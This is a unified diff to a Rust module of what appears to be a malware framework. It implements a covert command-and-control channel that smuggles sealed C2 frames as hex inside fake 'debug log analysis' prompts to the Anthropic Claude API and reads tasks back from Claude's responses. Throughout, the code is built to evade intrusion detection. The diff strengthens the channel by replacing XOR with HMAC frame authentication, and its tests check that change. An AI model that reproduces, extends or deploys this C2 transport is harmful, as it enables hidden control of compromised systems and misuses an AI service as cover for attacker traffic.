@@ -1,18 +1,28 @@
 //! LLM API C2 transport — Anthropic Claude API channel.
 //!
-//! ⚠ WARNING: This transport uses XOR obfuscation with a static key, NOT
-//! authenticated encryption. Anyone who recovers one known-plaintext frame
-//! can decrypt all subsequent traffic. The protocol-layer ChaCha20-Poly1305
-//! AEAD provides the real cryptographic protection — this XOR is only for
-//! making the traffic look like normal API text to a casual observer.
-//!
 //! Check Point Research (April 2026): LLM API traffic is the next-gen covert C2.
 //! Claude/Grok/Copilot API calls are TLS-encrypted, high-frequency, content-variable,
 //! and blend perfectly with legitimate AI dev traffic. No IDS signature can match.
 //!
 //! This channel wraps C2 frames as "debug log analysis" prompts sent to the Anthropic
-//! Messages API. The ciphertext is hex-encoded and embedded in a user message; Claude's
-//! response carries the hex-encoded response ciphertext disguised as "analysis output."
+//! Messages API. The sealed frame is hex-encoded and embedded in a user message; Claude's
+//! response carries the hex-encoded response frame disguised as "analysis output."
+//!
+//! ## Confidentiality & integrity
+//!
+//! There is NO transport-layer cipher here (CRITICAL-24): the old static-key XOR
+//! layer was removed because it added no security (known-plaintext on the
+//! predictable C2 framing broke all subsequent traffic) and could only weaken
+//! the protocol-layer ChaCha20-Poly1305 AEAD that already seals every frame.
+//! The frames this transport carries are already AEAD-sealed by
+//! `nyx_protocol::seal`; this layer only relays sealed bytes.
+//!
+//! To stop a third party (Claude prompt injection, a response from a different
+//! session, or an attacker who controls the API output) from injecting a frame,
+//! each relayed frame is wrapped as `hex(tag(32) || len_be(4) || sealed_frame)`
+//! (CRITICAL-23, see [`crate::traits::seal_frame`]). `recv` verifies the tag
+//! before treating the payload as a frame; a hex run extracted from an
+//! unrelated response fails verification and is ignored.
 //!
 //! Rate limit: 5 RPM on free tier — enforced with a 15 s inter-frame delay.
 
@@ -21,7 +31,7 @@ use std::time::{Duration, Instant};
 use rand::Rng;
 use ureq::Agent;
 
-use crate::traits::{Transport, TransportError};
+use crate::traits::{open_frame, seal_frame, Transport, TransportError};
 
 // ---- Constants -------------------------------------------------------------
 
@@ -36,26 +46,31 @@ const RECV_PROMPT: &str =
 
 /// Covert C2 channel tunnelled through the Anthropic Claude Messages API.
 ///
-/// Frames are XOR-encrypted with a session key (placeholder — real key exchange
-/// belongs at the protocol layer), hex-encoded, and smuggled inside Claude
-/// prompts that look like mundane developer debugging sessions.
+/// Frames are already AEAD-sealed by the protocol layer; this transport just
+/// relays them as hex inside Claude prompts that look like mundane developer
+/// debugging sessions. An HMAC tag (CRITICAL-23/24) lets `recv` reject any
+/// hex blob it didn't seal, defeating prompt-injection frame injection.
 pub struct LlmApiTransport {
     api_key: String,
     model: String,
     api_url: String,
     agent: Agent,
     conversation_id: String,
-    session_key: [u8; 32],
+    /// HMAC-SHA256 key for relayed-frame integrity (CRITICAL-23/24). Derived
+    /// per-channel from the session key; NOT a cipher key.
+    channel_secret: [u8; 32],
     last_send: Option<Instant>,
 }
 
 impl LlmApiTransport {
     /// Create a new LLM API transport channel.
     ///
-    /// `session_key` is a 32-byte shared secret used to XOR frames. In
-    /// production this MUST come from an authenticated key exchange (ECDH);
-    /// the transport layer treats it as opaque — it is the caller's
-    /// responsibility to establish and rotate it.
+    /// `session_key` is the 32-byte shared secret the protocol layer already
+    /// holds. It is domain-separated into a per-channel HMAC key (see
+    /// [`crate::traits::derive_channel_key`]) used ONLY to authenticate relayed
+    /// frames against injection — it is not a cipher key. Confidentiality comes
+    /// from the protocol-layer AEAD; the transport no longer applies any cipher
+    /// of its own (CRITICAL-24: the old static-key XOR layer was removed).
     pub fn new(api_key: String, model: String, session_key: [u8; 32]) -> Self {
         Self {
             api_key,
@@ -63,7 +78,7 @@ impl LlmApiTransport {
             api_url: ANTHROPIC_API_URL.to_string(),
             agent: Agent::new(),
             conversation_id: nanoid(),
-            session_key,
+            channel_secret: crate::traits::derive_channel_key(&session_key, b"llm"),
             last_send: None,
         }
     }
@@ -75,14 +90,6 @@ impl LlmApiTransport {
     }
 
     // ---- internal helpers --------------------------------------------------
-
-    /// XOR-encrypt `data` with the session key, cycling the key.
-    fn xor_frame(&self, data: &[u8]) -> Vec<u8> {
-        data.iter()
-            .enumerate()
-            .map(|(i, b)| b ^ self.session_key[i % self.session_key.len()])
-            .collect()
-    }
 
     /// Post a user message to the Claude API and return the text content of
     /// Claude's response.
@@ -186,19 +193,19 @@ impl Transport for LlmApiTransport {
 
         self.enforce_rate_limit();
 
-        // 1. XOR-encrypt with session key.
-        let ciphertext = self.xor_frame(frame);
+        // Seal the frame with an HMAC tag + length prefix so recv can reject
+        // anything we didn't seal (CRITICAL-23/24). No transport-layer cipher:
+        // confidentiality is the protocol-layer AEAD's job.
+        let sealed = seal_frame(&self.channel_secret, frame);
+        let hex_ct = hex::encode(&sealed);
 
-        // 2. Hex-encode.
-        let hex_ct = hex::encode(&ciphertext);
-
-        // 3. Embed in a legitimate-looking Claude prompt.
+        // Embed in a legitimate-looking Claude prompt.
         let prompt = format!(
             "[{conv_id}] {HEX_PREAMBLE}{hex_ct}",
             conv_id = self.conversation_id
         );
 
-        // 4. POST to Claude API.
+        // POST to Claude API.
         self.post_message(&prompt, 50)?;
 
         Ok(())
@@ -212,18 +219,25 @@ impl Transport for LlmApiTransport {
         // so Claude returns hex-encoded ciphertext as "analysis output."
         let text = self.post_message(RECV_PROMPT, 200)?;
 
-        // Extract the hex block from Claude's response.
-        let hex_ct = Self::extract_hex(&text)
-            .ok_or(TransportError::Transient("no hex data in LLM response"))?;
+        // Extract the hex block from Claude's response. A missing hex run is
+        // a transient "no frame yet" — Claude just didn't echo one.
+        let hex_ct = match Self::extract_hex(&text) {
+            Some(h) => h,
+            None => return Err(TransportError::Transient("no hex data in LLM response")),
+        };
 
-        // Decode hex → ciphertext.
-        let ciphertext = hex::decode(&hex_ct)
-            .map_err(|_| TransportError::Transient("invalid hex in LLM response"))?;
+        // Decode hex → sealed blob.
+        let blob = match hex::decode(&hex_ct) {
+            Ok(b) => b,
+            Err(_) => return Err(TransportError::Transient("invalid hex in LLM response")),
+        };
 
-        // XOR-decrypt → plaintext frame.
-        let plaintext = self.xor_frame(&ciphertext);
-
-        Ok(plaintext)
+        // CRITICAL-23/24: verify the HMAC tag before treating the blob as a
+        // frame. A hex run extracted from a prompt-injected response, a
+        // different session's output, or an attacker-controlled API reply
+        // fails here and is rejected — never decoded as a frame.
+        open_frame(&self.channel_secret, &blob)
+            .map_err(|_| TransportError::Transient("LLM response failed integrity check"))
     }
 
     fn health_check(&self) -> Option<u64> {
@@ -249,7 +263,10 @@ impl Transport for LlmApiTransport {
     }
 
     fn init(&mut self) -> Result<(), TransportError> {
-        tracing::warn!("LLM API transport uses XOR obfuscation only — not authenticated encryption. Do not rely on this for confidentiality.");
+        // No transport-layer cipher warning is needed here anymore: the XOR
+        // layer was removed (CRITICAL-24) and confidentiality is provided by
+        // the protocol-layer AEAD. Frame integrity is enforced by the HMAC
+        // framing applied in send/recv.
         self.health_check().map(|_| ()).ok_or(TransportError::Dead(
             "LLM API key invalid or endpoint unreachable",
         ))
@@ -280,25 +297,73 @@ fn nanoid() -> String {
 mod tests {
     use super::*;
 
-    #[test]
-    fn xor_roundtrip() {
-        let key = [0xAAu8; 32];
-        let transport =
-            LlmApiTransport::new("sk-test".into(), "claude-sonnet-4-20250514".into(), key);
-        let plaintext = b"hello world c2 frame data";
-        let ct = transport.xor_frame(plaintext);
-        let pt = transport.xor_frame(&ct);
-        assert_eq!(pt, plaintext);
+    // ---- CRITICAL-23/24: HMAC framing replaces removed XOR layer --------
+
+    /// Hex form of a frame sealed through the LLM send path. Mirrors what
+    /// `send` embeds in the Claude prompt.
+    fn sealed_hex(t: &LlmApiTransport, frame: &[u8]) -> String {
+        hex::encode(seal_frame(&t.channel_secret, frame))
     }
 
     #[test]
-    fn xor_key_cycling() {
-        let key = [0xFFu8; 32];
-        let transport = LlmApiTransport::new("sk-test".into(), "m".into(), key);
-        let long = vec![0xAAu8; 64]; // twice the key length
-        let ct = transport.xor_frame(&long);
-        assert_eq!(ct[0], 0xAA ^ 0xFF);
-        assert_eq!(ct[32], 0xAA ^ 0xFF);
+    fn sealed_frame_roundtrips_through_llm_framing() {
+        // The legitimate path: a frame this transport sealed verifies and
+        // decodes back to the original bytes via the recv-side logic.
+        let transport = LlmApiTransport::new(
+            "sk-test".into(),
+            "claude-sonnet-4-20250514".into(),
+            [0xAA; 32],
+        );
+        let frame = b"hello world c2 frame data";
+        let hex_ct = sealed_hex(&transport, frame);
+
+        // Recv side: extract_hex → hex::decode → open_frame.
+        let extracted = LlmApiTransport::extract_hex(&format!("analysis: {hex_ct}"))
+            .expect("sealed hex is a valid hex run");
+        let blob = hex::decode(&extracted).expect("hex decodes");
+        assert_eq!(open_frame(&transport.channel_secret, &blob).unwrap(), frame);
+    }
+
+    #[test]
+    fn unsealed_hex_run_in_response_is_rejected() {
+        // CRITICAL-23/24 regression: the old recv took the longest hex run
+        // from Claude's response and decoded it directly (after a trivial
+        // XOR that known-plaintext broke). A prompt-injected response, or
+        // output from a different session, that contained a hex run would
+        // inject a frame. Now the HMAC tag must verify first.
+        let transport = LlmApiTransport::new("sk-test".into(), "m".into(), [0xFF; 32]);
+        let attacker_hex = hex::encode(b"evil-injected-task-from-prompt-injection");
+        let blob = hex::decode(&attacker_hex).unwrap();
+        assert_eq!(
+            open_frame(&transport.channel_secret, &blob),
+            Err(crate::traits::FrameIntegrityError)
+        );
+    }
+
+    #[test]
+    fn forged_tag_with_wrong_session_key_is_rejected() {
+        // An attacker who captured a sealed frame and tries to forge a new
+        // one under a guessed session key must fail the tag check.
+        let legit = LlmApiTransport::new("sk-test".into(), "m".into(), [0x11; 32]);
+        let attacker = LlmApiTransport::new("sk-test".into(), "m".into(), [0x22; 32]);
+        let forged = seal_frame(&attacker.channel_secret, b"evil-task");
+        assert_eq!(
+            open_frame(&legit.channel_secret, &forged),
+            Err(crate::traits::FrameIntegrityError)
+        );
+    }
+
+    #[test]
+    fn channel_secret_differs_from_slack_and_mcp_labels() {
+        // Domain separation: the same session key must yield distinct MAC
+        // keys per channel so a tag sealed for Slack/MCP can't be replayed
+        // on the LLM channel.
+        let sk = [0x42u8; 32];
+        let llm = LlmApiTransport::new("sk-test".into(), "m".into(), sk);
+        let slack_key = crate::traits::derive_channel_key(&sk, b"slack");
+        let mcp_key = crate::traits::derive_channel_key(&sk, b"mcp");
+        assert_ne!(llm.channel_secret, slack_key);
+        assert_ne!(llm.channel_secret, mcp_key);
     }
 
     #[test]
